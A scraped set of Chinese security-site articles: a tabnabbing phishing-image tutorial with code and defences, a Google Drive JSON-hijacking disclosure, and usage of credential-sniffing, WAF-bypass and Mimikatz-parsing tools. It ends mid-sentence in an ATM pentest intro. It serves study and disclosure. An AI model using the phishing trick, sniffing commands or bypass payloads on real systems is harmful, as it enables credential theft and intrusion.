Alto称，截至目前，已知的Komplex木马有三个版本，分别可用来攻击x64架构、x86架构以及x64和x86架构。目前有多少人感染了Komplex病毒还是未知数。","2016-10-28 15:24:33","安全工具","解码Sofacy APT组织开发新的Flash Player利用平台——DealersChoice","http://nsoad.com/Security-tools/20161028/tools-652.html"
"5ccbfa804f2f0a0a7a69c078","从t0到t3 - 信息搜集一开始，我们拥有的帐号是一个没有特权的普通账号。假设我们已经在远程或者在本地利用EXP进行了一次攻击并且获得了一个反弹回来的shell。根本上说，在时","Kong","关于安全开发的一些思考之前面试某宝的时候，某人问过我，如果解决开发不懂安全的问题，就比如说SSRF,XEE这样的漏洞，一旦发生安全事故，应该立刻去响应，并帮助开发人员修复漏洞。难道写一个jar包，然后丢给数以百计的业务去调用？还是你去手把手的去教给开发，应该如何修改代码？！其实在java动态代理中，就已经解决了这种问题，本人将从以下几个方面，帮助大家理解动态代理的知识。对于懂java的“安全牛”来说这是一件很简单的事情，本文目的主要是记录下解决问题的过程。静态代理jdk动态代理CGLIB代理Spring AOP这里用到的jar包的下载地址如下：https://github.com/cglib/cglib/releases/download/RELEASE_3_2_4/cglib-nodep-3.2.4.jar为什么使用动态代理作为在乙方工作的“安全工程狮”有时候想一下还是幸福的，最近通过跟甲方的某狮子交流，发现业务量很大的情况下，一旦发生了安全问题，解决起来真是个麻烦的事情，需要收集资产，要出方案，最难的是教会开发修补漏洞，仔细思考了这个问题，遂想到了java动态代理，周末的时候研究了一下，现在分享给大家。设想一下，如果你挨个去教给开发应该怎么去修复漏洞，那么24小时之内完成应急是根本不可能完成的。比较高效的方法是，安全的逻辑都由安全部门实现，我们只需要留给开发一个接口供他们去使用就ok。那怎么样才可能通过，不修改源代码的情况下，增加业务的安全性，就是通过今天说的java动态代理。静态代理定义接口：public interface Hello1 {public void say(String name);}实现类：public class HelloImpl implements Hello1{@Overridepublic void say(String name) {    // TODO Auto-generated method stub    System.out.println(""Hello""+name);}}hello1代理类： public class HelloProxy implements Hello1{ private Hello1 hello;public HelloProxy(){    hello=new HelloImpl();}@Overridepublic void say(String name){    before();    hello.say(name);    after();}private void after() {    // TODO Auto-generated method stub    System.out.println(""after"");}private void before() {    // TODO Auto-generated method stub    System.out.println(""before"");}} 主函数：public static void main(String[] args){         Hello1 helloProxy=new HelloProxy();    helloProxy.say(""Jack"");}由上面的过程可以看得出来，我们通过hello1的代理类，增加了say()函数，通过代理，实现了before和after函数。这就是我要说的代理，只不过这事静态代理，通用性差，修改起来麻烦。下面说动态代理。jdk动态代理public class DynamicProxy2 implements InvocationHandler {public Object target;@SuppressWarnings(""unchecked"")public &lt;T&gt; T getProxy(){    return (T)Proxy.newProxyInstance(target.getClass().getClassLoader(),             target.getClass().getInterfaces(), this);}public DynamicProxy2(Object target) {    // TODO Auto-generated constructor stub    this.target=target;}@Overridepublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable {    // TODO Auto-generated method stub    before();    Object result=method.invoke(target, args);    after();;    return result;}private void after() {    // TODO Auto-generated method stub    System.out.println(""after"");}private void before() {    // TODO Auto-generated method stub    System.out.println(""before"");}主函数：public static void main(String[] args) {    // TODO Auto-generated method stub    DynamicProxy2 dynamicProxy2 = new DynamicProxy2(new HelloImpl());    Hello1 helloproxy= dynamicProxy2.getProxy();    helloproxy.say(""hi java"");}这里可以看到通过jdk动态代理，首先实现InvocationHandler接口，然后实现了invoke方法。从主函数中可以看到，这里我们并不关心你的类是什么，你的接口是什么，只要你把实现接口的类传递进来，就可以了，这个方案看起来是很不错的。好像可以解决一开始的需求，但是jdk动态代理只能代理接口，而不能代理没有接口的类，这种情况该怎么解决？CGLIB动态代理public class CGLibProxy implements MethodInterceptor {  @SuppressWarnings(""unchecked"")public&lt;T&gt; T getProxy(Class&lt;T&gt; cls){    return (T) Enhancer.create(cls, this);}@Overridepublic Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable {    // TODO Auto-generated method stub    before();    Object result=proxy.invokeSuper(obj, args);    after();    return result;}private void after() {    // TODO Auto-generated method stub    System.out.println(""after"");}private void before() {    // TODO Auto-generated method stub    System.out.println(""before"");   }}主函数：    public static void main(String[] args) {    // TODO Auto-generated method stub    CGLibProxy cglibproxy=new CGLibProxy();    Hello1 helloproxy=cglibproxy.getProxy(HelloImpl.class);    helloproxy.say(""asd"");}这里需要引入开篇时候的那个jar包。CGLIB可以代理没有接口的类，这就弥补了jdk动态代理的不足。通过jdk，cglib动态代理，就可以解决以上遇到的问题。","2016-11-04 15:47:23","Web安全","安全开发Java动态代理","http://nsoad.com/Article/web/20161104/700.html"
"5ccbfa804f2f0a0a7a69c079","你相信吗？仅仅是因为你点击了某个你一只在访问网站里的一张图片，导致你的用户名、密码泄漏，甚至电脑被植入病毒。这一切可不仅仅是危言耸听。","silence","你相信吗？仅仅是因为你点击了某个你一只在访问网站里的一张图片，导致你的用户名、密码泄漏，甚至电脑被植入病毒。这一切可不仅仅是危言耸听。利用的方法来源于一个算不上漏洞的漏洞 。Freebuf 曾经也报道过（链接地址中的target=”_blank”属性，为钓鱼攻击打开了大门），但这个“漏洞”至今还是可以利用。这篇文章，让我们实际运用一下这个漏洞，来实现钓鱼。攻击原理我们先来看看这一攻击是如何实现的，主要的原因是带有target=”_blank”属性的标签，如下面的代码&lt;a target=""_blank"" href=""http://XX.XX ""&gt; HELLO&lt;/a&gt;看起来没什么问题，实际上，如果用户打开该网站，而该网站又正好有一段这样的代码&lt;script&gt;if(window.opener){  window.opener.location  = ""http://google.com "";}&lt;/script&gt;那当你打开，并且载入后，原来的网站将会自动跳转到Google。思路众所周知，目前很多网站，包括一些个人博客。都有提供评论，或者留言的功能，有一些还支持调用外部图片在本站显示。我们正好可以利用这一点来实现我们所希望的功能。首先，我们要准备一张图片，这里用一段代码的图片来演示，但为了提高钓鱼的成功率，我们要做一点小修改，比如修改下它的大小。看起来非常模糊，很多时候都会忍不住，点击打开查看。毕竟，“点击查看大图”这一功能已经深入人心了！评论区显示图片的代码如以下的样子。在评论区里看到的图片应该是下面这个样子但当你忍不住打开图片的时候，就会发生神奇的事情当你打开后，确实能看到原来那张图片的放大版。但与此同时，原来那个网页却正在悄悄的改变……这里为了更加直观，我们使用Google来演示。在实际运用中，也许我们可以转到一个与原来网站一模一样的页面，提示用户登陆，我们甚至可以完全模拟该网站，仅仅把网站的内的下载链接篡改成自己的病毒软件。原理实现要实现这样的一个钓鱼图片，我们首先需要一个网络空间，这里使用php来完成这一切（世界上最好的语言，哼！）这里的逻辑主要是判断页面请求。这些请求信息都在$_SERVER系统变量里面，所以我们首先需要找到不同方式下请求头会有什么不同。我们可以通过这一小段函数来收集一些信息，这里的意思是把$_SERVER内的内容保存至log.txt内。file_put_contents(""log.txt"",print_r($_SERVER,true),FILE_APPEND);通过对输出的log.txt进行对比，发现其中一个请求头有可以利用的地方[HTTP_ACCEPT] =&gt; image/webp,image/*,*/*;q=0.8[HTTP_ACCEPT] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8通过img标签访问的是第一个，而直接通过浏览器访问的是第二个。由此可以想到通过$_SERVER[‘HTTP_ACCEPT’]来判断是否是浏览器访问。接下来，只需要几行简单的代码，就能把这个功能写出来第一步，判断$_SERVER[‘HTTP_ACCEPT’]前5个字符，是否为image，如果是，则跳转到freebuf-test-l.png这个图片，如果不是则说明是通过浏览器访问，那就执行我们之前说的JS代码。好啦！用几行简单的代码，一个钓鱼图片就建立起来了。我们接下来要优化一下URL。毕竟你外链一个XX.XX/index.php 肯定会引起别人怀疑。一般来讲我们可以用一下伪静态来实现访问/XX.jpg但实际上却是访问/XX.php的功能。但是我这里是用一个免费空间来测试，而这个空间并不支持伪静态。那不如让我们转个弯——用文件夹来实行“伪静态”。在程序目录建立一个/t.jpg 的目录新建一个index.php 文件OK！现在就能用XX.XX/t.jpg 来访问。接下来我们要在跳转的网页上做文章了。既然要实现钓鱼的功能，那最重要的就是不能让用户发现这个网站有问题，否则怎么会乖乖的把他的用户名和密码输入进去了？同时，还要考虑到一个问题，我们来利用这个进行钓鱼并不是只针对个别的网站，对不同的网站都要适用。对此一般有以下几种思路：    1.将要跳转之前的URL通过GET传输到服务端，通过服务端对源网页进行拉取、渲染。这样的好处有很多，比如你可以控制输出的EMAIL内容、支付信息、甚至直接替换显示的资源，给用户返回一个替换过的exe文件、pdf文档等等。缺点也不能忽视，明显能感觉到的是，速显变慢了（从目标服务器拉取到你的服务器，再从你的服务器传给客户端），尤其是2台服务器处在不同的国家。2.同样是通过get传递url信息，但不同的是直接用HTML的iframe 。首先用php构建html页面，在HTML里用iframe 把网页地址嵌入。然后弹窗提示用户登陆……是不是看起来很眼熟？没错就是运营商搞的那一套。这样也有好处和坏处，好处是实现简单，速度较快。坏处是控制能力不强。而且你对iframe里的内容也无可奈何，只能眼睁睁的盼望着用户乖乖的输入密码登陆。如何避免该漏洞对于该漏洞，网络上的报道很多，基本也都给了修复方式，我在此也不必多说，只提供几点小建议。对网站：对每一个需要使用target=”_blank”的链接都加上 rel=”noopener noreferrer” 这个属性。同时要关注用户上传的图片，或许你应该像关注xss一样关注一下外链图片的问题。对用户：小心！小心！再小心！关注一下你点开的链接。使用右键-&gt;在新标签中打开链接 来打开新的连接！小结这篇文章并不是技术文，涉及到的技术点也很少，主要在于分享一个我自己的小思路，如果有说的不对的地方还请见谅。对于上面的一点，也许有人会有疑问。就是为什么不用HTTP_REFERER来判断来源地址，其实我最开始也是使用这个，但由于浏览器的一些安全策略，在一些浏览器（列如我的CHROME下）该值为空，也就是说浏览器不会发送该头信息。这个漏洞，每个网站管理员都应该给予重视。就拿该图片钓鱼来讲，攻击者完全可以在各大WP博客等网站批量的尝试，可控性、隐蔽程度都非常高。并且，这个漏洞甚至可以运用来做显示广告赚取佣金，不仅能批量发，还能避免被发现。BTW，貌似freebuf后台的投稿界面里好像也可以添加外链图片","2016-10-11 15:01:38","Web安全","点击一张图片背后的风险","http://nsoad.com/Article/web/20161011/523.html"
"5ccbfa804f2f0a0a7a69c07a","项目主页https://github.com/DanMcInerney/net-creds简介Net-Creds是一款快速从数据包或者接口中嗅探密码以及Hash的工具截图SniffsURLs visited","Kong","项目主页https://github.com/DanMcInerney/net-creds简介Net-Creds是一款快速从数据包或者接口中嗅探密码以及Hash的工具截图SniffsURLs visitedPOST loads sentHTTP form logins/passwordsHTTP basic auth logins/passwordsHTTP searchesFTP logins/passwordsIRC logins/passwordsPOP logins/passwordsIMAP logins/passwordsTelnet logins/passwordsSMTP logins/passwordsSNMP community stringNTLMv1/v2 all supported protocols like HTTP, SMB, LDAP, etcKerberos示例自动检测接口用于嗅探sudo python net-creds.py选择eth0接口sudo python net-creds.py -i eth0忽略来自192.168.0.2的数据包sudo python net-creds.py -f 192.168.0.2读取pcappython net-creds.py -p pcapfileOSXCredit to epocs:sudo easy_install pipsudo pip install scapysudo pip install pcapybrew install libdnet --with-pythonmkdir -p /Users/&lt;username&gt;/Library/Python/2.7/lib/python/site-packagesecho 'import site; site.addsitedir(""/usr/local/lib/python2.7/site-packages"")' &gt;&gt; /Users/&lt;username&gt;/Library/Python/2.7/lib/python/site-packages/homebrew.pthsudo pip install pypcapbrew tap brona/iproute2macbrew install iproute2mac然后替换 line 74 ‘/sbin/ip’ 和 ‘/usr/local/bin/ip’.","2016-10-29 15:58:47","安全工具","Net-Creds：快速嗅探数据包及接口中的敏感信息","http://nsoad.com/Security-tools/20161029/tools-664.html"
"5ccbfa804f2f0a0a7a69c07b","WAFNinja是一款用python写的命令行工具，它可以帮助渗透测试人员免去部分手动输入的烦恼。此外，WAFNinja强大的扩展性，在团队协作中显得非常适用。","kong","WAFNinja是一款用python写的命令行工具，它可以帮助渗透测试人员免去部分手动输入的烦恼。此外，WAFNinja强大的扩展性，在团队协作中显得非常适用。工具简介这款工具里有许多的攻击payload和用于fuzz的字符串，都储存在附带的sqlite数据库文件里。另外，WAFNinja支持HTTP的GET和POST请求，也支持带上cookie。当然，必要的时候，我们还可以设置代理。    大致用法：wafninja.py [-h] [-v] {fuzz, bypass, insert-fuzz, insert-bypass, set-db} ...下面给出部分案例：fuzz：python wafninja.py fuzz -u ""http://www.target.com/index.php?id=FUZZ""  -c ""phpsessid=value"" -t xss -o output.html bypass：python wafninja.py bypass -u ""http://www.target.com/index.php""  -p ""Name=PAYLOAD&amp;Submit=Submit"" -c ""phpsessid=value"" -t xss -o output.html插入型fuzz：python wafninja.py insert-fuzz -i select -e select -t sql参数大致介绍fuzz                检查能绕过WAF的关键词和符号.bypass           用数据库中payload进行批量测试insert-fuzz       添加需要fuzz的字符串insert-bypass     为bypass的字典添加payloadset-db              添加另外一个数据库文件，可分享给其他人-h, –help           显示帮助信息         -v, –version        显示程序版本号","2016-12-01 23:30:36","安全工具","WAFNinja：灵活的WAF自动化Fuzz工具","http://nsoad.com/Security-tools/20161201/tools-875.html"
"5ccbfa804f2f0a0a7a69c07c","概述在内网渗透和模拟攻击中，Mimikatz（或其衍生物）通常是标准工具包的一部分。它具有很强大的功能，其中最亮的功能是直接从 lsass.exe 进程里获取windows处于active状态","Kong","概述在内网渗透和模拟攻击中，Mimikatz（或其衍生物）通常是标准工具包的一部分。它具有很强大的功能，其中最亮的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码。它通常以以下形式显示输出：	Username :	Domain :	Password :虽然一些工具将解析这个输出，但在有些情况下，能够解析多个文件很有用，也可能包括mimikatz的输出，也许与其他输出交错。示例包括当使用一个LSASS内存dump取文件或者分析来自一系列RAT以及shells原始输出时Mimikatz的输出，这可能不包括内置Mimikatz解析功能。我对这个问题的解决方案是编写一个相对快速的工具，它使用正则表达式从流输入定位有趣的mimikatz输出，并将其插入SQLite数据库。这是具有能够快速检索的优势，与其他参考材料（例如ADOffline的帖子，这可以允许你通过访问的组/访问级别快速关联受损凭证），或以其他简单格式导出。位置获取源代码：https://github.com/stufus/parse-mimikatz-log，或者通过克隆git存储库。												1															git clone https://github.com/stufus/parse-mimikatz-log.git									 用法这是一个命令行工具，它接受两个选项，每一个都需要一个参数：						选项			说明							-d			指定要使用的数据库文件。			如果存在，则假设模式是正确的。			如果它不存在，它将被创建。			如果未指定此参数，将创建一个临时文件。							-i			要使用的mimikatz输出文件。			如果 – 作为参数传递给它，将使用STDIN。			数据库数据库只有一个table – creds-存储已导入的证书。						内容			说明							domain			凭据所关联的域。			这是从日志文件的“* Domain：”部分捕获的。							username			用户名，从日志文件的“* Username：”部分捕获。 这始终是日志文件中显示的凭据块的第一部分。							password			已恢复的明文口令，从凭据块的“* Password：”部分捕获。							ntlm			已恢复的NTLM散列，从凭证块的’* NTLM：’部分捕获。							sha1			已恢复的SHA1散列，从凭证块的“* SHA1：”部分捕获。			还有一个视图（查看用户凭据），其中包含用户名，域和密码并排除所有用户名后面有$的（这将指定一个计算机帐户）。Example填充数据库一个选项是使用命令来捕获整个日志文件到屏幕以及从标准输入读取：$ find ./ -name \*.log -exec cat {} \; | pml.py -d /tmp/passwords.db -i -        .mMMMMMm.             MMm    M   WW   W   WW   RRRRR      mMMMMMMMMMMM.           MM   MM    W   W   W    R   R     /MMMM-    -MM.           MM   MM    W   W   W    R   R    /MMM.    _  \/  ^         M M M M     W W W W     RRRR    |M.    aRRr    /W|        M M M M     W W W W     R  R    \/  .. ^^^   wWWW|        M  M  M      W   W      R   R       /WW\.  .wWWWW/         M  M  M      W   W      R    R       |WWWWWWWWWWW/         .WWWWWW.           Quick &amp;amp; Dirty Mimikatz Log Parser                        stuart.morgan@mwrinfosecurity.com | @ukstufus Opening database: /tmp/passwords.dbReading from STDIN  Processing line 236676/236676 (100%)         Sets of credentials: 949    Unique 'user' usernames: 355    Unique 'user' passwords: 278另一种选择是找到所有的日志文件，并单独运行每个日志文件：												1															find ./ -name \*.log -exec ./pml.py -d /tmp/passwords.db -i {} \;									 提取凭据数据库需要加载到SQLite中：可以列出所有用户凭据：凭据可以以username：password格式（’||’是SQLite中的并列运算符，’.once’将输出写入文件）导出：凭据也可以使用与上述相同的技术以DOMAIN \ username：password格式导出：共享相同密码的用户的数量可以通过诸如以下的查询找到，其将显示每个密码和具有该密码的用户的数量：","2016-10-16 16:52:20","系统安全","解析Mimikatz日志文件","http://nsoad.com/Article/system/20161016/577.html"
"5ccbfa804f2f0a0a7a69c07d","Kodachi Linux 是一款基于 Debian 8.6 的操作系统。它是专为保护用户隐私而设计的，因此具有高度的安全及匿名性，并具备反调查取证的特点。","secist","Kodachi Linux 是一款基于 Debian 8.6 的操作系统。它是专为保护用户隐私而设计的，因此具有高度的安全及匿名性，并具备反调查取证的特点。Kodachi 的使用也非常方便简单，你可以通过 USB 驱动来在你的 PC 上启动它。当你完全启动 Kodachi 操作系统后，你将会建立一个 VPN+Tor+DNScry 服务器的运行环境。你不需要特别了解或学习 Linux 的知识，Kodachi 都为你准备好了你所需要的！整个操作系统都活动在你的临时内存 RAM 下。因此，你一旦你关机，任何的操作痕迹都会被清除，避免你的隐私泄露及被追踪调查。Kodachi 是一个实时的操作系统，你可以从几乎任何计算机上来启动它。例如：从 DVD，U盘 或 SD卡等。它旨在保护你的隐私及匿名性，并帮助你：匿名使用互联网。所有与 Internet 的连接，都将被强制通过 VPN，然后通过 DNS 加密的 Tor 网络。在你使用的计算机上不会留下任何痕迹，除非你要求保留一些数据痕迹。使用先进的加密和隐私工具加密你的文件，电子邮件和即时消息。Kodachi 是基于实体 Debian Linux 和 定制 XFCE ，这使得 Kodachi 系统非常的稳定、安全并且独特。    视频：特点：连接 VPN         连接 Tor 和 出口节点选择         DNScrypt 服务器运行环境         拥有 Truecrypt 加密 – keepass 密码管理系统- 安全云等         免费开源随机 Mac 地址生成         RAM 关闭/重启 时清除         内置 Tor 浏览器         Pidgin 即时通讯         比特币 钱包Litecoin 钱包         免费内置 VPN         DNSCrypt         多个 Tor 出口节点转换器         多个 DNS 选项Vera 加密         PeerGuardian（P2P网络安全软件）         Bleachbit、Nautilus-wipe、Keepass2xdotool、Seahorse、Gpa、Gnupg2、Enigmail、ufw、gufw、firejailKomodo / Geany 开发环境，Krusader 文件管理器、Meld 代码对比、Shutter 多媒体、FileZilla、Audicity 音频处理、Terminator、Transmission、VirtualBox APPSHtop 进程浏览器、Rdesktop、Gksu、Ncdu、Xtrlock、Nmap、Pcmanfm、Cairo-dock、Geoip-bin、Sysv-rc-conf、Disper、Smbclient、Syslinux-utils、Fcitx、Ibus、Pidgin-OtrKodachi 的安装使用：方式一（推荐）：下载 ISO 文件，并使用免费刻录工具（如 Rufus 或 Linux Live）将其刻录到 U 盘，然后通过插入 PC 来启动。你需按 F12键（不同电脑类型按键可能不同）进入引导菜单，并更改 BIOS 从 USB 启动。方式二：下载 ISO 文件，并使用免费刻录工具（如 DAEMON Tools）将其刻录到 DVD 上，然后通过 PC 的光盘启动。     方式三：下载 ISO 文件，使用 Vmware 或 Virtualbox 虚拟机来启动。提示：以普通用户身份登录系统：Username: kodachiPassword:r@@t00以 root 身份登录：Username:rootPassword:r@@t00如果需要使用 Sudo 命令或 su 转到 root 身份，密码同样为：r@@t00    要更改用户 Kodachi 和 root 的密码，可以使用以下命令：    passwd # changes Kodachi passwordsupasswd # changes root passwordexit想要运行 Windows 可执行文件 exe，你需要安装 wine 命令如下：sudo apt-get install wine-bin：i386如果你想在外部屏幕上显示，你必须确保在引导过程之前，连接 VGA 或 HDMI 电缆时启动 Kodachi，如果在这个过程中仍然遇到一些问题，你可以使用以下命令：disper -s ＃仅用于单屏disper -S ＃仅用于外屏＃如果工具栏被弄乱，按 ALT F2 键，然后敲回车如果想要锁定你的 PC，可以同时按下 CTRL+ ALT+ L 键，或通过以下命令：xtrlockKodachi 附带了许多预安装的应用和工具，你可以通过单击来更改 Tor 的出口节点国家，以及重置你的 DNS 服务器。同时，你也不必担心你的无线或显示驱动程序不匹配，Kodachi 已经为我们集成了大多数，常用的驱动程序。我们可以在哪使用 Kodachi：个人计算机桌面或直接从（U盘 和 DVD 启动）使用。         公司的计算机上（从 U盘 和 DVD 启动）使用。网吧（从 U盘 和 DVD 启动）使用。         酒店或旅行期间（从 U盘 和 DVD 启动）使用。学校机房（从 U盘 和 DVD 启动）使用任何可以（从 U盘 和 DVD ）启动使用的计算机上。安装向导：如何在你的硬盘驱动器上安装 Kodachi Linux：    从你的 USB 或 ISO 映像引导。在桌面菜单上进入 – &gt;系统 – &gt; Refracta 安装程序 – &gt;使用 su – &gt;输入密码 r@@t00 – &gt;简单安装 – &gt;运行 GParted – &gt;设备 – &gt;创建分区表 – &gt;应用 – &gt;分区 – &gt;新建 – &gt;添加 – &gt;应用所有操作 – &gt;关闭 – &gt;关闭 GParted 窗口 – &gt;选择分区 – &gt;确定 – &gt;继续安装 – &gt;关闭窗口 – &gt; y – &gt;配置主机及用户名！不要在这里更改用户名，否则 Kodachi 脚本会出现错误 – &gt;勾选前 2 个框允许和使用 sudo 为默认 – &gt;使用当前密码 – &gt;OK -&gt;使用当前密码 -&gt;OK。完成以上操作后，接着我们来重启系统，此时它将从你的硬盘驱动器启动。注意：我们不建议在任何电脑上永久安装 Kodachi Linux，因为它会将所有的设置保存在硬盘上，这就违背了该系统反取证的初衷！了解更多关于取证内容，请点击 这里 。    Kodachi 是一个基于 Debian 的实时 DVD / USB 操作系统，因此所有软件包，也都基于纯 Debian 存储库。Kodachi 是 Apache License 2.0 下的开源项目，所有在系统上使用的代码都是纯文本 bash 脚本，并且包含在 ISO 包中，没有编译过的二进制代码， 也没有隐藏的 Kodachi 代码，这些代码都可在 GitHub 中查看到。如果你滥用带宽或托管非法的文件，你将会被永久禁止使用 Kodachi！如有任何疑问，你都可以与我们 取得联系。Kodachi 下载：https://sourceforge.net/projects/linuxkodachi/","2017-01-08 14:33:59","安全工具","为保护隐私而生，反取证操作系统：kodachi","http://nsoad.com/Security-tools/20170108/tools-996.html"
"5ccbfa804f2f0a0a7a69c07e","=在2015年10月，我在在谷歌电子表单有关的API接口中发现了JSON + CSRF（跨站伪造请求）点击劫持漏洞。攻击者可以利用这个漏洞在未授权访问Google Drive文件的情况下，获取用","Kong","=在2015年10月，我在在谷歌电子表单有关的API接口中发现了JSON + CSRF（跨站伪造请求）点击劫持漏洞。攻击者可以利用这个漏洞在未授权访问Google Drive文件的情况下，获取用户的电子表单信息。漏洞影响在网络上利用这个漏洞攻击的时候，攻击者需要绕过Google Drive电子表单共享设置的ACL策略。首先说明下，攻击者在未授权访问Google Drive文件的情况下(如下图所示),可以利用该漏洞绕过Google安全设置： 漏洞产生的根本原因这不是第一个Google存在JSON数据劫持，从而导致用户数据泄漏的漏洞。漏洞的根源是Google Drive API接口的数据流设计，由此造成OWASP TOP(2013)-A8-Cross-site Request Forgery(CSRF)漏洞从而导致JSON数据劫持。漏洞的攻击并不难，曾经的Google Gmail就存在CSRF+JSON劫持漏洞。2016.01.27 -- 对Gmail攻击的高级技巧2008.11.20 -- JSON攻击的风骚姿势2010.10.14 -- Gmail的JSON劫持攻击技术JSON劫持攻击，谷歌是这样修复的：在JSON里面添加一个while()循环，如果攻击发生就会使受害者的浏览器崩溃，从而导致攻击失效。但是，对于Google Drive的JSON劫持漏洞来说，仅仅添加一个循环是远远不够的。为了不影响Google Drive的产品功能，必要的修复需要复杂的变更。Google选择了让旧API 接口下线，使用新的接口来解决安全问题。这需要使用这些接口的开发者更新代码。漏洞攻击场景（众多利用中的一个）公司的一个电子表格里面有机密信息。电子表格只共享给授权的公司职员。一名职员离职之后，他的授权帐号被取消，同时被分享的文件里面密码/PIN也改变。新的共享如下图所示，可以看到离职的员工权限已经被取消。 原力与你同在现在被取消授权的员工非常想要获得电子表单的数据，他知道Mr.admin.assist@example.com喜欢经常去一个网站，而这个网站允许任何人使用HTML格式留言。这就是众所周知的水坑攻击，攻击者只需要等待。下图是受害者访问的网站截屏在完全不知道受害者（不管是谁是文档的拥有者）的情况下，攻击者就可以收到电子表格的数据。下图是攻击者偷取到的数据（受害者完全看不到）攻击者看到的数据如下： 这是如何成为可能的呢？Google Drive的API接口在不需要OAuth token的情况下，允许其他网站跨域发起请求。这种情况下，只要用户登录Google Drive之后，其他任何网站就可以通过调用API接口获取用户的电子表格数据。因为返回数据是JSON格式，所以可以利用JavaScript解析之后发送到攻击者的服务器。简单的漏洞证明代码如下：simpleCapture.php - 从受害者浏览器获取数据的脚本google_drive_smuggle.html - 这个HTML代码用来偷取目标数据下面是一个JSON劫持代码例子：var google = new Object();  google.visualization = new Object();  google.visualization.Query = new Object();           google.visualization.Query.setResponse = function(goods) {          google.response = JSON.stringify(goods, undefined, 2);                     }Google Drive的API接口返回的数据是JSON格式的Javascript对象，这个数据我们可以在跨域的页面获取到，只需要简单发送到自己的服务器即可。时间线日期    事件2015.10.29    报告给Google2015.10.30    Google确认漏洞，同时询问了Google的修复时间2015.11.6    Google回复：产品组希望他们最终的改变不会占用下一年用户的大量时间。正如你所说的，这个问题需要小心处理，因为众多用户在使用这个功能。但是我很高兴他们已经有些进展，并且很快就会修复。2016.1.5      询问Google修复时间2016.1.6      Google回复修复时间无法确定2016.1.14     询问Google大致修复时间2016.1.27     90天内不会修复2016.2.5     Google回复更新（距离漏洞报告已经99天，距离上次联系Google 30天）2016.2.15     谷歌无法确定修复时间2016.2.25     询问谷歌的Bug编号2016.2.25     谷歌回应相应的Bug编号2016.3.17    询问谷歌修复时间2016.4.1    Google回复：“抱歉，我们暂时没有修复的时间线，修复之后会第一时间通知您”2016.4.26      180天未修复2016.5.31    215天未修复，询问修复时间2016.6.3     Google回复他们正在修复问题，并且正在转变产品以避免影响大量用户2016.8.17        询问修复时间2016.8.17     Google在同一天回复，他们已经向用户打开警告信息，告诉用户API正在改变2016.9.13        已经确认警告信息上线2016.9.15    322天之后漏洞最终修复完成。 最新的修复在对这个问题进行深入了解之后，Google确认以前的那种修复方式不是最好的选择。他们选择把旧的API下线并且使用新的代替。这个是最有效的解决方法，从我的观点来看，对旧的API进行边边角角的修复还有可能存在安全问题。现在如果使用旧的API，Google就会弹窗提醒用户旧的API将会失效。 最终的修复确认我最终确认这个Bug在2016年9月15号被修复。 最终章在花费几个月和Google的联系之后，见证了问题修复并且电子表单又一次安全加固。曾经从Google得到回复是很困难的，但是我感觉相比施压披露出来，修复才是更好的选择。在影响较小的范围内完整修复，是一件繁琐的事情。由此我被Google加入到了他们的赏金榜单。你可以在这里找到我的资料","2016-10-31 15:29:36","Web安全","谷歌电子表单CSRF+JSON劫持漏洞","http://nsoad.com/Article/web/20161031/673.html"
"5ccbfa8a4f2f0a0a7a69c07f","subDomainsBrute 1.0.3A simple and fast sub domain brute tool for pentesters. It can rearch as fast as 1000 DNS queries per second.这个脚本的主要目标是发现其他工","Kender","subDomainsBrute 1.0.3A simple and fast sub domain brute tool for pentesters. It can rearch as fast as 1000 DNS queries per second.这个脚本的主要目标是发现其他工具无法探测到的域名, 如Google，aizhan，fofa。高频扫描每秒DNS请求数可超过1000次。早期版本参见安全脉搏《subDomainsBrute — 改进渗透测试时暴力枚举子域名的python脚本》Change Log (Nov 9, 2016)Time performance optimizationPlaceholder {alphnum} {alpha} {num} could be used in Names FileDependenciesFirst you need to install dnspython to do DNS querypip install dnspythonUsageUsage: subDomainsBrute.py [options] target.comOptions:  --version             show program's version number and exit  -h, --help            show this help message and exit  --full                Full scan, a large NAMES FILE will be used during the scan  -i, --ignore-intranet                        Ignore domains pointed to private IPs  -o OUTPUT, --output=OUTPUT                        Output file name. default is {target}.txt参数 -t 已经去掉了，想要设定并发线程的数量，请直接修改dict\dns_servers.txt文件中的行数即可。Screenshot","2016-11-13 17:52:43","安全工具","暴力枚举子域名工具subDomainsBrute 1.0.3 全新发布","http://nsoad.com/Security-tools/20161113/tools-759.html"
"5ccbfa8a4f2f0a0a7a69c080","写在前面的话自从有了自动取款机（ATM），我们在进行取款、存款、以及汇款等银行交易时，就再也不需要去银行营业厅排队了。我们可以通过ATM来进行存取现金、访问银行账户或","Kong","写在前面的话自从有了自动取款机（ATM），我们在进行取款、存款、以及汇款等银行交易时，就再也不需要去银行营业厅排队了。我们可以通过ATM来进行存取现金、访问银行账户或信用账户、账单支付、修改密码、以及更新个人信息等操作。由于ATM机涉及的通常是现金交易，因此它也成为了黑客和犯罪分子们的首要攻击目标。多年以来，黑客已经找到了各种各样的方法来入侵ATM机。现在，黑客们的攻击手段已经不仅限于物理形式的攻击了，他们正在开发新的方法来入侵ATM机。在这篇文章中，我们不仅会给大家讲解ATM机的工作机制和它所采用的安全防护策略，而且还会告诉大家如何通过渗透测试来分析ATM机的安全性。除此之外，我们也会给大家提供一些避免ATM机遭到攻击的最佳实践方案。ATM机的工作机制绝大多数的ATM机配备有两个输入口和四个输出口。通常情况下，读卡器和键盘为输入口，屏幕、凭条打印机、出钞口和扬声器为输出口。具体如下图所示：ATM机需要与后台服务器（即通信主机）进行数据通信，这台主机服务器则需要与银行的网络系统进行通信并响应ATM机的请求。当用户插入了银行卡并进行取款操作时，ATM机会怎样处理这种请求呢？处理流程如下图所示：1. 用户的账户数据存储在银行卡背面的磁条中，当用户插入银行卡后，ATM机的读卡器会从磁条中读取用户的数据。接下来，用户的账户数据将会被发送至后台主机，然后再由后台主机将用户数据转发给相应的银行。2. 银行确认了这张卡片的有效性之后，会要求用户输入银行卡的密码。用户需要使用键盘来输入密码，密码在加密处理完成之后会被发送至主机服务器。接下来，主机服务器便会向银行验证用户卡号和密码是否能够匹配。银行验证成功之后，主机服务器会将相应的响应码发送给ATM机。3. 